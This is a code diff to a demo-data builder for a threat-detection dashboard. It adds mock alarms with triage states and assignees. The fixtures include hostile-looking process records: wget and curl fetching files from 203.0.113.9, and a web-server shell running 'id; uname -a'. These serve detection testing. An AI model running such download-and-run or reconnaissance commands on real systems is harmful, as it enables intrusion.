@@ -348,7 +348,9 @@ export function buildDemoData(now = Date.now()) {
   // Threat alarms (P14): a few process starts that matched a rule.
   const proc = (pid: number, exe: string, args: string[], uid = 33, cwd?: string) =>
     ({ pid, exe, args, uid, euid: uid, truncated: false, ...(cwd ? { cwd } : {}) });
-  const alarmSpecs = [
+  type Proc = ReturnType<typeof proc>;
+  type AlarmSpec = { rule: string; severity: string; message: string; count: number; minutes: number; process: Proc; ancestors: Proc[]; state?: string; assignee?: string };
+  const alarmSpecs: AlarmSpec[] = [
     { rule: "web-server-spawns-shell", severity: "high", message: "A web server started a shell", count: 3, minutes: 12,
       process: proc(48211, "/usr/bin/sh", ["sh", "-c", "id; uname -a"], 33, "/var/www/html"),
       ancestors: [proc(1102, "/usr/sbin/nginx", ["nginx: worker process"], 33, "/"), proc(1100, "/usr/sbin/nginx", ["nginx: master process /usr/sbin/nginx"], 0, "/")] },
@@ -361,6 +363,19 @@ export function buildDemoData(now = Date.now()) {
     { rule: "web-server-spawns-shell", severity: "high", message: "A web server started a shell", count: 41, minutes: 2,
       process: proc(51002, "/usr/bin/sh", ["sh", "-c", "/usr/local/bin/healthcheck"], 33, "/"),
       ancestors: [proc(1102, "/usr/sbin/nginx", ["nginx: worker process"], 33, "/")] },
+    // Handled and assigned ones, so the Alarms list has every state and a few people to filter by.
+    { rule: "shell-from-database", severity: "critical", message: "A database server started a shell", count: 2, minutes: 1500, state: "mitigated", assignee: "sam",
+      process: proc(61007, "/usr/bin/bash", ["bash"], 26, "/var/lib/pgsql"),
+      ancestors: [proc(2210, "/usr/bin/postgres", ["postgres: checkpointer"], 26, "/var/lib/pgsql")] },
+    { rule: "download-and-run", severity: "high", message: "A shell downloaded a program and ran it", count: 1, minutes: 2400, state: "accepted_risk", assignee: "ola",
+      process: proc(70441, "/usr/bin/wget", ["wget", "https://203.0.113.9/y"], 1000, "/home/ola"),
+      ancestors: [proc(9002, "/usr/bin/bash", ["bash"], 1000, "/home/ola")] },
+    { rule: "web-server-spawns-shell", severity: "low", message: "A web server started a shell", count: 5, minutes: 3000, state: "false_positive",
+      process: proc(40118, "/usr/bin/dash", ["dash", "-c", "logrotate"], 33, "/"),
+      ancestors: [proc(1102, "/usr/sbin/nginx", ["nginx: worker process"], 33, "/")] },
+    { rule: "download-and-run", severity: "medium", message: "A shell downloaded a program and ran it", count: 3, minutes: 600, assignee: "sam",
+      process: proc(88213, "/usr/bin/curl", ["curl", "-o", "z", "https://203.0.113.9/z"], 1000, "/home/ola"),
+      ancestors: [proc(9003, "/usr/bin/bash", ["bash"], 1000, "/home/ola")] },
   ];
   const alarms = alarmSpecs.map((spec, index) => {
     const agent = agents[(index * 7) % agents.length];
@@ -370,7 +385,7 @@ export function buildDemoData(now = Date.now()) {
       rule_set_id: "baseline", rule_id: spec.rule, severity: spec.severity, message: spec.message,
       exe: spec.process.exe, parent_exe: spec.ancestors[0]?.exe ?? null, count: spec.count,
       first_seen: iso(last - spec.count * 3 * MINUTE), last_seen: iso(last),
-      state: "open", suppressed_by: null as string | null,
+      state: spec.state ?? "open", suppressed_by: null as string | null,
       rule_set_version: 4, rule_version: 1, confidence: 80, process: spec.process, ancestors: spec.ancestors,
       received_at: iso(last + 2000),
       detection: {
@@ -379,7 +394,7 @@ export function buildDemoData(now = Date.now()) {
           { key: "parent.exe", status: "complete", value: spec.ancestors[0]?.exe ?? "", item_count: null }],
         steps: [{ expression: `event["process.exe"] == ${JSON.stringify(spec.process.exe)} && event["parent.exe"] == ${JSON.stringify(spec.ancestors[0]?.exe ?? "")}`, result: true }],
       },
-      triage: { state: "open", assigned_to: (index === 2 ? "sam" : null) as string | null, note: null as string | null,
+      triage: { state: spec.state ?? "open", assigned_to: (index === 2 ? "sam" : spec.assignee ?? null) as string | null, note: null as string | null,
         accepted_until: null as string | null, version: index === 2 ? 2 : 1, updated_at: null as string | null, updated_by: null as string | null },
     };
   });
